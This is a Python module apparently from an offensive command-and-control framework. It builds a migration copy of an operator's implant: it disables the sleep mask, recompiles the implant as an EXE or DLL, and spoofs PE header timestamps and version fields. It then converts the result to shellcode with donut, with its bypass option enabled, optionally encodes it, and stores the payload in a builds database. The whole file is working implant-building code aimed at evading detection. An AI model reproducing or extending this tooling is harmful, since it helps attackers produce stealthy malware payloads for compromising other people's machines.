import shutil
from pathlib import Path

from infra.database.database import Builds, sqlite_db

from ...blocking_io import run_in_thread

from .build import dll as compile_dll
from .build import exe as compile_exe
from .donut import main as donut_main
from .encoder import apply_shellcode_encoder
from .pe import (
    major_image_version,
    major_linker_version,
    major_os_version,
    major_subsystem_version,
    minor_image_version,
    minor_linker_version,
    minor_os_version,
    minor_subsystem_version,
    timestamp,
)
from . import prep


async def migrate_copy(build_tag, source_path, config):
    # Stores the shellcode bytes for a later migrate
    if str(config.get("format", "exe")).strip().lower() != "shellcode":
        return

    src = Path(source_path)
    if not src.is_file():
        return

    sc = await run_in_thread(src.read_bytes)
    if not sc:
        return

    encoder = str(config.get("shellcode_encoder") or "off").strip().lower()
    if encoder not in ("", "off", "none"):
        sc, enc_err = await apply_shellcode_encoder(sc, config, f"{build_tag}-migrate")
        if enc_err or not sc:
            return

    out = Path(__file__).resolve().parents[7] / "infra" / "builds" / f"{build_tag}.bin"

    def write_shellcode():
        # Writes the shellcode bytes to disk
        out.parent.mkdir(parents=True, exist_ok=True)
        out.write_bytes(sc)

    await run_in_thread(write_shellcode)
    path = str(out)
    rows = await sqlite_db.read(Builds, tag=build_tag)
    if rows:
        await sqlite_db.modify(Builds, {"tag": build_tag}, {"shellcode_path": path})
    else:
        await sqlite_db.write(Builds(tag=build_tag, shellcode_path=path))


async def migrate(build_tag, operator_pe_path, config, compile_tag, body, icon_obj=None):
    # Builds a sleep mask off copy and stores its shellcode
    if str(config.get("format", "exe")).strip().lower() == "shellcode":
        await migrate_copy(build_tag, operator_pe_path, config)
        return

    arch = {"x86": 1, "x64": 2}.get(config.get("arch"))
    tmp = prep.tmpdir
    if arch is None or not tmp:
        return

    operator_pe = Path(operator_pe_path)
    backup = operator_pe.with_suffix(operator_pe.suffix + ".operator")
    await run_in_thread(shutil.copy2, operator_pe, backup)

    await run_in_thread(prep.cleanup_preface, tmp)

    sleep_mask = str(config.get("sleep_mask", "off"))
    migrate_patches = []
    if sleep_mask != "off":
        migrate_patches.append(
            (f'const sleepMask* = "{sleep_mask}"', 'const sleepMask* = "off"'),
        )
    if migrate_patches:
        await run_in_thread(prep.patch_files, tmp, migrate_patches)

    migrate_config = {**config, "sleep_mask": "off"}
    fmt = str(migrate_config.get("format", "exe")).strip().lower()
    if fmt == "dll":
        build = await compile_dll(migrate_config, compile_tag, body)
    else:
        build = await compile_exe(migrate_config, compile_tag, body, icon_obj=icon_obj)

    if build.get("status") == "failure":
        await run_in_thread(shutil.copy2, backup, operator_pe)
        await run_in_thread(backup.unlink, True)
        return

    migrate_pe = build["path"]
    if migrate_config.get("pe_timestamp"):
        migrate_pe = await timestamp(migrate_config, compile_tag, migrate_pe)
    if migrate_config.get("pe_major_linker_version") is not None:
        migrate_pe = await major_linker_version(migrate_config, compile_tag, migrate_pe)
    if migrate_config.get("pe_minor_linker_version") is not None:
        migrate_pe = await minor_linker_version(migrate_config, compile_tag, migrate_pe)
    if migrate_config.get("pe_major_os_version") is not None:
        migrate_pe = await major_os_version(migrate_config, compile_tag, migrate_pe)
    if migrate_config.get("pe_minor_os_version") is not None:
        migrate_pe = await minor_os_version(migrate_config, compile_tag, migrate_pe)
    if migrate_config.get("pe_major_image_version") is not None:
        migrate_pe = await major_image_version(migrate_config, compile_tag, migrate_pe)
    if migrate_config.get("pe_minor_image_version") is not None:
        migrate_pe = await minor_image_version(migrate_config, compile_tag, migrate_pe)
    if migrate_config.get("pe_major_subsystem_version") is not None:
        migrate_pe = await major_subsystem_version(migrate_config, compile_tag, migrate_pe)
    if migrate_config.get("pe_minor_subsystem_version") is not None:
        migrate_pe = await minor_subsystem_version(migrate_config, compile_tag, migrate_pe)

    sc = await donut_main(
        compile_tag,
        file=migrate_pe,
        arch=arch,
        bypass=1,
        entropy=1,
        compress=1,
        headers=1,
        exit_opt=3,
        thread=0,
    )

    await run_in_thread(shutil.copy2, backup, operator_pe)
    await run_in_thread(backup.unlink, True)

    if not sc:
        return

    encoder = str(migrate_config.get("shellcode_encoder") or "off").strip().lower()
    if encoder not in ("", "off", "none"):
        sc, enc_err = await apply_shellcode_encoder(sc, migrate_config, f"{build_tag}-migrate")
        if enc_err or not sc:
            return

    out = Path(__file__).resolve().parents[7] / "infra" / "builds" / f"{build_tag}.bin"

    def write_shellcode():
        # Writes the shellcode bytes to disk
        out.parent.mkdir(parents=True, exist_ok=True)
        out.write_bytes(sc)

    await run_in_thread(write_shellcode)
    path = str(out)
    rows = await sqlite_db.read(Builds, tag=build_tag)
    if rows:
        await sqlite_db.modify(Builds, {"tag": build_tag}, {"shellcode_path": path})
    else:
        await sqlite_db.write(Builds(tag=build_tag, shellcode_path=path))
